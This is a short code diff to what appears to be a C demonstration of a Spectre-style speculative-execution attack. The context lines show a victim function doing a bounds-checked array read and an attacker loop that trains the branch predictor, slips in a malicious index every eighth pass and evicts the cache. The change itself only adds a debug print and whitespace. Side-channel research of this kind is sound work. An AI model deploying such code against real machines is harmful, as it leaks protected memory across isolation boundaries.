@@ -239,6 +239,7 @@ uint8_t array[8] = {0, 1, 2, 3, 4, 5, 6, 7};
 volatile int32_t array_size = 8;
 
 int naive_victim(uint8_t *pages, int32_t idx, size_t stride) {
+    printf("%i\n", idx);
     if (idx < array_size) {
         volatile uint8_t temp = *(pages+(*(array+idx) * stride));
     }
@@ -278,7 +279,7 @@ void naive_attacker() {
             for (size_t t = 0; t < 16; t++) {
                 bool is_attack = (t % 8 == 8 - 1);
                 int32_t index = cselect(malicious_index + c, 0, is_attack);
-
+                
                 fuzzy_evict();
                 fence();
 
